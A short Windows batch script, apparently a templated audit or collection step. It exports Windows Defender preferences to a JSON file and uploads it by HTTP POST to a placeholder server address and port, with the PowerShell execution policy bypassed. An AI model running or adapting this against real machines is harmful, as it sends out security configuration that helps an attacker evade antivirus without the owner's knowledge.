@echo off
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-MpPreference | ConvertTo-Json -Depth 5 | Out-File -FilePath C:\audit_defender.json -Encoding ascii; Invoke-WebRequest -Uri \"http://{{SERVER_IP}}:{{UPLOAD_PORT}}\" -Method POST -InFile C:\audit_defender.json -Headers @{\"X-Filename\"=\"audit_defender.json\"} -UseBasicParsing"
